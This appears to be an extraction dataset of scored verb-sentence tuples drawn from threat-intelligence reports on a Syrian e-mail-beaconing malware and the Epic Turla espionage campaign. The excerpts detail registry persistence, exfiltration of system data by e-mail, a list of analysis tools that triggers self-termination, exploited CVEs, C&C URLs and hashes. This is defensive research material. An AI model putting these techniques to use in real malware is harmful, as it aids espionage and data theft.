stolen digital certificates making it harder to detect by security tools')(1.0, 'installed', ' It is unknown if the attackers successfully retrieved the information\n    they were seeking, if they installed other back door Trojans or gained passwords that allowed them to directly\n    access the computers, or if they have given up on the target')(1.0, 'stolen', ' These attacks can include nonspecific data\n    breaches where employee or customer records get stolen, as happened to the US Department of Energy in July\n    2013')(0.3125, 'adds', '\n\nFirst, the program nvidrv adds itself to autorun:\n<list>\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run under name “UpdAdbreader”\n</list>\n\x0cIt also creates a series of registry keys that the individual programs use to communicate:\n\nRegistry keys and programs using them:\n<list>\nrundl132.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K6F-DKV8J-FKVJI-\nGVKBU\\6nvisdvr.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K4F-DKV8J-FKVJI-\nGVKBU\\4GoogleUpate.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K3F-DKV8J-FKVJI-\nGVKBU\\3AdbrRader.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K2F-DKV8J-FKVJI-\nGVKBU\\2nvidrv.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K1F-DKV8J-FKVJI-GVKBU\\1\nSets name “1” to StartupInfo structure as a string, e.g')(0.36363636363636365, 'perform', '\n\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions,\nincluding:\n<list>\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n</list>\n</section>\n<section>\n<heading>Program Sequence</heading>\n\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task\nand communicating via markers left in the registry')(0.2, 'left', '\n\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions,\nincluding:\n<list>\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n</list>\n</section>\n<section>\n<heading>Program Sequence</heading>\n\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task\nand communicating via markers left in the registry')(0.23684210526315788, 'writes', '\n\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions,\nincluding:\n<list>\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n</list>\n</section>\n<section>\n<heading>Program Sequence</heading>\n\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task\nand communicating via markers left in the registry')(1.0, 'is', '\n\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions,\nincluding:\n<list>\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\n</list>\n</section>\n<section>\n<heading>Program Sequence</heading>\n\nThe program sequence of data collection and sending is somewhat unusual, with each program performing a single task\nand communicating via markers left in the registry')(1.0, 'sends', '\n\nFurther, because the malware sends data captured by the malware to an e-mail address, it does not require that the\nattackers maintain a command-and-control server online')(0.14285714285714285, 'runs', ' “0x3110x611”\n</list>\nIt then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader')(0.15625, 'developed', '\n\nThis attack, which has little technical sophistication (i.e., it uses no exploits, code obfuscation, or techniques to frustrate\nreversing, etc.), nevertheless has carefully developed social engineering in the seeding materials and bait document')(0.8, 'Use', '\n      Use of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among\n      others)')(0.5555555555555556, 'resend', ' The function of\nthe malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each\nreboot')(1.0, 'drop', ' However, that malware had\nsubstantially more functionality than this case: not only did it drop a second stage from a compromised site, but was also\nincluded a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype')(0.75, 'sends', ' The\nmalware then sends an e-mail to the same inbox containing the text “Hello” and with mxtd file attached')(0.3333333333333333, 'transmitting', '\nNevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware\non a network, including transmitting data via encrypted e-mail communications')(1.0, 'reduce', '\nNevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware\non a network, including transmitting data via encrypted e-mail communications')(0.5555555555555556, 'zips', '\n\nNext, “rundl132.exe” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected\nmachine:\n<list>\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n\x0c[REDACTED]0\n</list>\nNext, rundl132 writes:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\n</list>\nThen rundl132 writes the external IP to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n</list>\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder')(1.0, 'performs', '\n\nNext, “rundl132.exe” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected\nmachine:\n<list>\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n\x0c[REDACTED]0\n</list>\nNext, rundl132 writes:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\n</list>\nThen rundl132 writes the external IP to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n</list>\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder')(1.0, 'collects', '\n\nNext, “rundl132.exe” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected\nmachine:\n<list>\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n\x0c[REDACTED]0\n</list>\nNext, rundl132 writes:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\n</list>\nThen rundl132 writes the external IP to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n</list>\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder')(0.18181818181818182, 'runs', '\n\nNext, “rundl132.exe” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected\nmachine:\n<list>\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n\x0c[REDACTED]0\n</list>\nNext, rundl132 writes:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\n</list>\nThen rundl132 writes the external IP to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\n</list>\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder')(0.8333333333333334, 'sent', '\n</section>\n<section>\n<heading>Analyzing the Attack</heading>\n\nThis section describes a highly targeted attack sent to an e-mail address belonging to RSS')(0.7058823529411765, 'registered', ' It registered only 6/55 detections by anti virus scanners, or a 10% detection rate')(0.7, 'checking', '\nIt then runs rundl132 if it has not before, by checking whether registry key name “6” is present')(0.25, 'runs', '\nIt then runs rundl132 if it has not before, by checking whether registry key name “6” is present')(0.8666666666666667, 'sends', '\n\nThe malware is also interesting because it does not provide remote access, but only sends an e-mail containing\nthe victim’s IP address and miscellaneous system information')(0.625, 'leaving', '\nThe malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time')(1.0, 'triggered', ' The system information could be used to\nidentify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the\nvictim’s system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used')(1.0, 'attract', ' A RAT\nwould have provided much greater access alongside IP information\n\nBy not providing remote access and other RAT functionality, the program looks less like malware, and may attract less\nattention from endpoint protection tools and scanners')(0.7142857142857143, 'looks', ' A RAT\nwould have provided much greater access alongside IP information\n\nBy not providing remote access and other RAT functionality, the program looks less like malware, and may attract less\nattention from endpoint protection tools and scanners')(1.0, 'profiled', ' The file\ncontained custom malware that profiled the victim’s computer and beaconed its IP address to an e-mail\naccount under the attacker’s control')(0.5714285714285714, 'beaconed', ' The file\ncontained custom malware that profiled the victim’s computer and beaconed its IP address to an e-mail\naccount under the attacker’s control')(0.3333333333333333, 'used', ' That incident, observed in 2012, also used hardcoded e-mail to exfiltrate')(0.23529411764705882, 'aims', ' Although targeted, the malware seeding\n      often aims at classes of people (e.g., people interested in ‘shocking’ news about a fighter, or ‘leaked’ information\n      about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group')(1.0, 'sets', ' It sets the key to “0” and\nruns it')(0.5, 'runs', ' It sets the key to “0” and\nruns it')(0.13333333333333333, 'runs', '\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\n</list>\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\n</list>\nThen nvidrv runs nvisdvr (registry key “4”) that collects a list of running processes, which are written to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\n</list>\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com')(0.5555555555555556, 'doing', '\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\n</list>\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\n</list>\nThen nvidrv runs nvisdvr (registry key “4”) that collects a list of running processes, which are written to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\n</list>\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com')(0.6, 'tests', '\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\n</list>\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\n</list>\nThen nvidrv runs nvisdvr (registry key “4”) that collects a list of running processes, which are written to:\n<list>\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\n</list>\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com')(0.6, 'located', '\n      At least one command-and-control server located within Syrian IP space (often from a limited range of addresses)')(0.14285714285714285, 'dropped', '\n250 2.0.0 Ok: queued as [REDACTED]\nQUIT\n221 2.0.0 Bye\n</list>\n</section>\n<section>\n<heading>Evaluation of the Malware’s Functionality</heading>\n\nThe malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a\nsingle task, and each communicating via markers dropped in the Registry')(0.6, 'uses', '\n\nIn addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure')(0.29411764705882354, 'writes', ' AdbrRader\n(communicating through registry key “2”) writes the file vgadmysadm.tmp with the name of another registry key “2” with\nstartup info')(0.6, 'Transmitting', '\n\nTransmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a\nlayer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server')(1.0, 'is', ' Not only is it\nexceptionally targeted, but it is also not a commonly available RAT')(0.4166666666666667, 'obtain', '\n      The seeding attempts to obtain a ‘private’ Facebook identity from RSS through social engineering')(0.8823529411764706, 'took', '\n\nThe attack took the form of an unsolicited e-mail containing a download link to a decoy file')(0.42857142857142855, 'serve', ' This behaviour\nstrongly suggests that the function of this malware is to serve as a beacon')(0.5555555555555556, 'uploaded', ' For instance,\nanother tool often uploaded by the attackers to the victim\'s machine is "winrs.exe":\n<list>\n\x0cName: winrs.exe\nMD5: 1369fee289fe7798a02cde100a5e91d8\n</list>\nThis is an UPX packed binary, which contains the genuine "dnsquery.exe" tool from Microsoft, unpacked\nMD5: c0c03b71684eb0545ef9182f5f9928ca')(0.42857142857142855, 'achieve', '\n\nThe CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run\nunrestricted')(0.75, 'run', '\n\nThe CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run\nunrestricted')(0.125, 'used', ' The primary backdoor used in the Epic attacks is also known as\n"WorldCupSec", "TadjMakhal", "Wipbot" or "Tavdig"')(0.5, 'attempt', ' We have\nlocated several versions of this script which attempt various exploitation mechanisms')(0.9090909090909091, 'has', ' The backdoor extracted from the Java exploits has the following C&C hardcoded inside:\n<list>\nwww.arshinmalalan[.]com/themes/v6/templates/css/in.php\n</list>\nThis C&C is still online at the moment although it redirects to a currently suspended page at\n"hxxp://busandcoachdirectory.com[.]au"')(0.6666666666666666, 'commanded', '\n\nThe huge network commanded by the Epic Turla attackers serves multiple purposes')(0.5, 'used', ' The mothership also work as the exploitation servers\nused in the watering hole attacks, delivering Java, IE or fake applications to the victim')(0.6428571428571429, 'delivering', ' The mothership also work as the exploitation servers\nused in the watering hole attacks, delivering Java, IE or fake applications to the victim')(0.3333333333333333, 'work', ' The mothership also work as the exploitation servers\nused in the watering hole attacks, delivering Java, IE or fake applications to the victim')(0.26666666666666666, 'takes', ' This takes advantage of social engineering to trick the user into running a fake\nFlash Player (MD5: 030f5fdb78bfc1ce7b459d3cc2cf1877):\n\n<figure></figure>\n\n\nIn at least one case, they tried to trick the user into downloading and running a fake Microsoft Security\nEssentials app (MD5: 89b0f1a3a667e5cd43f5670e12dba411):\n<figure></figure>\n\x0cThe fake application is signed by a valid digital certificate from Sysprint AG:\n<list>\nSerial number: 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint: 24 21 58 64 f1 28 97 2b 26\n22 17 2d ee 62 82 46 07 99 ca 46\n</list>\n\n\n<figure></figure>\n<caption>Valid signature from Sysprint AG on Epic dropper</caption>\n\x0cThis file was distributed from the Ministry of Foreign Affairs of Tajikistan\'s website, at\n"hxxp://mfa[.]tj/upload/security.php"')(0.4375, 'trick', ' This takes advantage of social engineering to trick the user into running a fake\nFlash Player (MD5: 030f5fdb78bfc1ce7b459d3cc2cf1877):\n\n<figure></figure>\n\n\nIn at least one case, they tried to trick the user into downloading and running a fake Microsoft Security\nEssentials app (MD5: 89b0f1a3a667e5cd43f5670e12dba411):\n<figure></figure>\n\x0cThe fake application is signed by a valid digital certificate from Sysprint AG:\n<list>\nSerial number: 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint: 24 21 58 64 f1 28 97 2b 26\n22 17 2d ee 62 82 46 07 99 ca 46\n</list>\n\n\n<figure></figure>\n<caption>Valid signature from Sysprint AG on Epic dropper</caption>\n\x0cThis file was distributed from the Ministry of Foreign Affairs of Tajikistan\'s website, at\n"hxxp://mfa[.]tj/upload/security.php"')(0.6, 'uses', ' The communication protocol uses\n\n<figure></figure>\nrequests in the C&C replies, which the malware decrypts and processes')(0.5, 'deliver', '\n</section>\n<section>\n<heading>The Epic command-and-control infrastructure</heading>\n\nThe Epic backdoors are commanded by a huge network of hacked servers that deliver command and\ncontrol functionality')(0.8333333333333334, 'upload', '\n\n<figure></figure>\n</section>\n<section>\n\n<heading>Lateral movement and upgrade to more sophisticated backdoors</heading>\n\nOnce a victim is compromised, the attackers upload several tools that are used for lateral movement')(0.75, 'upgraded', ' If the\nvictim is interesting, they get upgraded to the Turla Carbon system')(1.0, 'exploit', "\n\nAnother more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player:\n\n\n<figure></figure>\n\n<caption>Java and Flash Player exploitation scripts</caption>\n\nAlthough the Flash Player exploits couldn't be retrieved, we did manage to obtain the Java exploits:\n<table>\n                      Name               MD5\n                      allj.html          536eca0defc14eff0a38b64c74e03c79\n                      allj.jar           f41077c4734ef27dec41c89223136cf8\n                      allj64.html        15060a4b998d8e288589d31ccd230f86\n                      allj64.jar         e481f5ea90d684e5986e70e6338539b4\n                      lstj.jar           21cbc17b28126b88b954b3b123958b46\n                      lstj.html          acae4a875cd160c015adfdea57bd62c4\n</table>\n\x0cThe Java files exploit a popular vulnerability, CVE-2012-1723, in various configurations")(0.3333333333333333, 'use', '\n\nThe payload dropped by these Java exploits is the following:\n<list>\nMD5: d7ca9cf72753df7392bfeea834bcf992\n</list>\nThe Java exploit use a special loader that attempts to inject the final Epic backdoor payload into\nexplorer.exe')(0.7142857142857143, 'dropped', '\n\nThe payload dropped by these Java exploits is the following:\n<list>\nMD5: d7ca9cf72753df7392bfeea834bcf992\n</list>\nThe Java exploit use a special loader that attempts to inject the final Epic backdoor payload into\nexplorer.exe')(0.8333333333333334, 'inject', '\n\nThe payload dropped by these Java exploits is the following:\n<list>\nMD5: d7ca9cf72753df7392bfeea834bcf992\n</list>\nThe Java exploit use a special loader that attempts to inject the final Epic backdoor payload into\nexplorer.exe')(0.4117647058823529, 'connects', '\n\nThis is an Epic backdoor which connects to the following C&Cs, with a generic internal ID of 1156fd22-\n3443-4344-c4ffff:\n<list>\nhxxp://homaxcompany[.]com/components/com_sitemap/\nhxxp://www.hadilotfi[.]com/wp-content/themes/profile/\n</list>\nA full list with all the C&C server URLs that we recovered from the samples can be found in the technical\nAppendix')(0.13513513513513514, 'is', '\n\nThis is an Epic backdoor which connects to the following C&Cs, with a generic internal ID of 1156fd22-\n3443-4344-c4ffff:\n<list>\nhxxp://homaxcompany[.]com/components/com_sitemap/\nhxxp://www.hadilotfi[.]com/wp-content/themes/profile/\n</list>\nA full list with all the C&C server URLs that we recovered from the samples can be found in the technical\nAppendix')(0.5714285714285714, 'validate', ' This is used to gain a foothold and validate the high profile victim')(0.3, 'contains', '\n\nThe file is a .NET application that contains an encrypted resource')(1.0, 'identify', '\n\nThe backdoor attempts to identify the following processes and, if found, it will terminate itself:\n<list>\n      tcpdump.exe\n      windump.exe\n      ethereal.exe\n      wireshark.exe\n      ettercap.exe\n      snoop.exe\n      dsniff.exe\n</list>\nIt contains an internal unique ID, which is used to identify the victim to the C&C')(1.0, 'terminate', '\n\nThe backdoor attempts to identify the following processes and, if found, it will terminate itself:\n<list>\n      tcpdump.exe\n      windump.exe\n      ethereal.exe\n      wireshark.exe\n      ettercap.exe\n      snoop.exe\n      dsniff.exe\n</list>\nIt contains an internal unique ID, which is used to identify the victim to the C&C')(0.9090909090909091, 'sent', '\n\nThrough monitoring, we were able to capture a large amount of commands sent to the victims by the\nattackers, providing an unique view into this operation')(0.55, 'talk', '\n\nHere\'s how the big picture looks like:\n<figure></figure>\n\x0c<caption>Epic Turla lifecycle</caption>\n\nThe first level of command and control proxies generally talk to a second level of proxies, which in turn,\ntalk to the "mothership" server')(0.2, 'called', '\n<list>\nSize: 275,968 bytes\nMD5: e9580b6b13822090db018c320e80865f\nCompiled: Thu Nov 08 11:05:35 2012\n\nanother example:\n\nSize: 218,112 bytes\nMD5: 071d3b60ebec2095165b6879e41211f2\nCompiled: Thu Nov 08 11:04:39 2012\n</list>\nThis backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the\n"Carbon system" or Cobra by the Turla attackers')(0.5714285714285714, 'sends', "\n\nDuring the first C&C call, the backdoor sends a pack with the victim's system information")(0.7272727272727273, 'target', '\n</section>\n<section>\n<heading>The watering hole attacks</heading>\n\nCurrently, the Epic attackers run a vast network of watering holes that target visitors with surgical\nprecision')(0.625, 'run', '\n</section>\n<section>\n<heading>The watering hole attacks</heading>\n\nCurrently, the Epic attackers run a vast network of watering holes that target visitors with surgical\nprecision')(1.0, 'implemented', '\n\nFor some of the C&C servers, the attackers implemented RSA encryption for the C&C logs, which makes it\nimpossible to decrypt them')(0.75, 'interact', ' The mothership server is generally a VPS, which runs the Control panel\nsoftware used to interact with the victims')(0.3333333333333333, 'runs', ' The mothership server is generally a VPS, which runs the Control panel\nsoftware used to interact with the victims')(0.6666666666666666, 'targeted', ' In this case, we found they targeted two\n\x0cranges belonging to:\n<list>\n      "Country A" - Federal Government Network\n      "Country B" - Government Telecommunications and Informatics Services Network\n</list>\nIt should be noted though, the fact that the attackers were targeting these ranges doesn\'t necessarily mean\nthey also got infected')(0.7142857142857143, 'upload', ' Once a victim is confirmed as "interesting", the\nattackers upload another Epic backdoor which has a unique ID used to control this specific victim')(0.375, 'control', ' Once a victim is confirmed as "interesting", the\nattackers upload another Epic backdoor which has a unique ID used to control this specific victim')(0.75, 'using', ' Sometimes, the attackers register the\n.JPG extension with the PHP handler on the server, using "JPG" files to run PHP scripts:\n\n\n\n<figure></figure>\n<caption>Profiling script</caption>\n\nThe main exploitation script "wreq.php", "main.php" or "main.jpg" performs a numbers of tasks')(0.8, 'define', '\n\nIt runs a control panel which is password protected:\n\n<figure></figure>\n\n\n<caption>Epic mothership control panel login</caption>\n\nOnce logged into the Control panel, the attackers can see a general overview of the system including the\nnumber of interesting potential targets:\n\n\n<figure></figure>\n\n<caption>Epic control panel status overview</caption>\n\nA very interesting file on the servers is task.css, where the attackers define the IP ranges they are\ninterested in')(0.8181818181818182, 'using', ' Most recently, we observed them using yet another technique coupled with\nwatering hole attacks')(0.8571428571428571, 'implements', '\n\nThe main backdoor is about 60KB in size and implements a C&C protocol on top of normal HTTP\n\x0crequests')(0.17647058823529413, 'contains', '\n<figure></figure>\n</section>\n<section>\n\x0c<heading>Language artifacts</heading>\n\nThe payload recovered from one of the mothership servers (at\nnewsforum.servehttp[.]com/wordpress/wp-includes/css/img/upload.php, MD5:\n4dc22c1695d1f275c3b6e503a1b171f5, Compiled: Thu Sep 06 14:09:55 2012) contains two modules, a\nloader/injector and a backdoor')(1.0, 'sent', ' All further\ninformation sent to the C&C is encrypted with a public key framework, making decryption impossible')(0.8, 'decide', ' Depending on the\n"tasks", they will decide whether to infect the visitors or not')(0.8666666666666667, 'use', ' Contact: intelreports@kaspersky.com\n</section>\n<section>\n<heading>The Epic Turla attacks</heading>\n\nThe attacks in this campaign fall into several different categories depending on the vector used in the\ninitial compromise:\n<list>\n\n      Spearphishing e-mails with Adobe PDF exploits (CVE-2013-3346 + CVE-2013-5065)\n\x0c      Social engineering to trick the user into running malware installers with ".SCR" extension,\n      sometimes packed with RAR\n      Watering hole attacks using Java exploits (CVE-2012-1723), Flash exploits (unknown) or Internet\n      Explorer 6,7,8 exploits (unknown)\n      Watering hole attacks that rely on social engineering to trick the user into running fake "Flash\n      Player" malware installers\n</list>\nThe attackers use both direct spearphishing and watering hole attacks to infect their victims')(1.0, 'load', '\n\nInjected websites load a remote JavaScript into the victim\'s browser:\n<figure></figure>\n\x0cThe script "sitenavigatoin.js" is a Pinlady-style browser and plugin detection script, which in turn,\nredirects to a PHP script sometimes called main.php or wreq.php')(0.75, 'uses', '\nThere are three possible values:\n<list>\n      TRY\n      DON\'T TRY -> Version of the browser and OS does not meet the conditions\n      DON\'T TRY -> (2012-09-19 10:02:04) - checktime < 60\n</list>\nThese are the "don\'t meet the conditions" reasons observed in the logs:\n<list>\n      Windows 7 or 2008 R2\n      MSIE 8.0\n      Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR\n      2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E)\n      Adobe Shockwave 11.5.1.601\n      Adobe Flash 10.3.181.14\n      Adobe Reader 10.1.0.0\n      Win Media Player 12.0.7601.17514\n      Quick Time null\n      MS Word null\n      Java null\n</list>\n</section>\n<section>\n<heading>The Epic / Tavdig / Wipbot backdoor</heading>\n\nFor this first stage of the attack, the threat actor uses a custom backdoor')(0.23809523809523808, 'is', '\n\nOne such tool observed in the attacks and saved as "C:\\Documents and Settings\\All users\\Start\nMenu\\Programs\\Startup\\winsvclg.exe" is:\n<list>\nName: winsvclg.exe\nMD5: a3cbf6179d437909eb532b7319b3dafe\nCompiled: Tue Oct 02 13:51:50 2012\n</list>\nThis is a keylogger tool that creates %temp%\\~DFD3O8.tmp')(0.3076923076923077, 'exploit', '\n\nOne version of this script attempts to exploit Internet Explorer versions 6, 7 and 8:\n<figure></figure>\n\x0c<caption>Internet Explorer exploitation script</caption>\n\nUnfortunately, the Internet Explorer exploits have not yet been retrieved')(0.8125, 'deploy', '\n\nOther packages delivered to the victims include:\n<list>\nMD5: c7617251d523f3bc4189d53df1985ca9\nMD5: 0f76ef2e6572befdc2ca1ca2ab15e5a1\n</list>\nThese top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to\nconfirmed victims, effectively linking the Epic and Turla Carbon operations together')(0.625, 'obtain', '\n\nOnce the attackers obtain the necessary credentials without the victim noticing, they deploy the rootkit\nand other extreme persistence mechanisms')(0.8, 'deploy', '\n\nOnce the attackers obtain the necessary credentials without the victim noticing, they deploy the rootkit\nand other extreme persistence mechanisms')(1.0, 'using', ' In February 2014 we observed the Miniduke threat actor using the same backdoor\non their hacked servers, although using a much stronger password')(0.7222222222222222, 'find', ' These include\nsearches for:\n<list>\n      *NATO*.msg\n      eu energy dialogue*.*\n      EU*.msg\n\x0c      Budapest*.msg\n</list>\n\nIn this case, the attackers were interested to find e-mails related to "NATO", 